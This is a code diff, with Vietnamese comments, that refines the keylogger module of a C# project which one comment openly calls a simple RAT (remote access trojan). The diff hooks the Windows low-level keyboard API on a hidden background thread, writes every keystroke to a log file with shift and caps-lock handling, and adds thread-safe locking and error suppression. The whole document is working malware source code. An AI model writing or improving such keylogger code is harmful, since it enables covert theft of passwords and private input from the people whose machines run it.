@@ -14,6 +14,8 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
         private static IntPtr _hookID = IntPtr.Zero;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static bool _isRunning = false;
+        private static Thread? _hookThread = null;
+        private static object _lockObj = new object(); // Lock để thread-safe
 
         // Các hàm API của Windows
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -37,29 +39,40 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
 
         public static void Start()
         {
-            if (_isRunning) return; // Đang chạy rồi thì thôi
-
-            // Chạy hook trên một luồng riêng biệt để không làm đơ Server
-            Thread hookThread = new Thread(() =>
+            lock (_lockObj)
             {
-                _hookID = SetHook(_proc);
-                _isRunning = true;
-                Application.Run(); // Vòng lặp giữ hook sống
-            });
-            hookThread.SetApartmentState(ApartmentState.STA);
-            hookThread.IsBackground = true;
-            hookThread.Start();
+                if (_isRunning) return; // Đang chạy rồi thì thôi
+
+                // Chạy hook trên một luồng riêng biệt để không làm đơ Server
+                _hookThread = new Thread(() =>
+                {
+                    try
+                    {
+                        _hookID = SetHook(_proc);
+                        _isRunning = true;
+                        Application.Run(); // Vòng lặp giữ hook sống
+                    }
+                    catch { }
+                    finally { _isRunning = false; }
+                });
+                _hookThread.SetApartmentState(ApartmentState.STA);
+                _hookThread.IsBackground = true;
+                _hookThread.Start();
+            }
         }
 
         public static void Stop()
         {
-            if (_isRunning && _hookID != IntPtr.Zero)
+            lock (_lockObj)
             {
-                UnhookWindowsHookEx(_hookID);
-                _hookID = IntPtr.Zero;
-                _isRunning = false;
-                // Lưu ý: Thread chứa Application.Run() sẽ tự kết thúc khi App đóng hoặc Hook gỡ (tùy ngữ cảnh), 
-                // nhưng với RAT đơn giản ta chỉ cần Unhook là ngừng ghi.
+                if (_isRunning && _hookID != IntPtr.Zero)
+                {
+                    UnhookWindowsHookEx(_hookID);
+                    _hookID = IntPtr.Zero;
+                    _isRunning = false;
+                    // Thread sẽ tự exit khi không còn events từ keyboard
+                    // Không call Application.Exit() vì nó ảnh hưởng toàn server
+                }
             }
         }
 
@@ -111,35 +124,37 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                 bool shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                 bool caps = Control.IsKeyLocked(Keys.CapsLock);
 
-                // Mở file để ghi (Append)
-                try {
-                    using (StreamWriter sw = File.AppendText(logPath))
-                    {
-                        string key = ((Keys)vkCode).ToString();
-
-                        // Xử lý sơ bộ một số phím (Logic cũ của bạn khá dài, đây là bản rút gọn demo)
-                        // Bạn có thể copy lại khối Switch Case khổng lồ cũ vào đây nếu muốn chi tiết
-                        switch ((Keys)vkCode)
+                // Ghi log thread-safe
+                lock (_lockObj)
+                {
+                    try {
+                        using (StreamWriter sw = File.AppendText(logPath))
                         {
-                            case Keys.Space: sw.Write(" "); break;
-                            case Keys.Return: sw.Write("[ENTER]"); break;
-                            case Keys.Back: sw.Write("[BS]"); break;
-                            case Keys.Tab: sw.Write("[TAB]"); break;
-                            default:
-                                // Logic xử lý chữ hoa/thường đơn giản
-                                if (key.Length == 1) // Ký tự A-Z, 0-9
-                                {
-                                    bool isUpper = shift ^ caps; // XOR: Shift hoặc Caps -> Hoa, cả 2 -> Thường
-                                    sw.Write(isUpper ? key.ToUpper() : key.ToLower());
-                                }
-                                else
-                                {
-                                    sw.Write($"[{key}]");
-                                }
-                                break;
+                            string key = ((Keys)vkCode).ToString();
+
+                            // Xử lý sơ bộ một số phím
+                            switch ((Keys)vkCode)
+                            {
+                                case Keys.Space: sw.Write(" "); break;
+                                case Keys.Return: sw.Write("[ENTER]"); break;
+                                case Keys.Back: sw.Write("[BS]"); break;
+                                case Keys.Tab: sw.Write("[TAB]"); break;
+                                default:
+                                    // Logic xử lý chữ hoa/thường
+                                    if (key.Length == 1) // Ký tự A-Z, 0-9
+                                    {
+                                        bool isUpper = shift ^ caps; // XOR
+                                        sw.Write(isUpper ? key.ToUpper() : key.ToLower());
+                                    }
+                                    else
+                                    {
+                                        sw.Write($"[{key}]");
+                                    }
+                                    break;
+                            }
                         }
-                    }
-                } catch { /* Bỏ qua lỗi ghi file */ }
+                    } catch { /* Bỏ qua lỗi ghi file */ }
+                }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
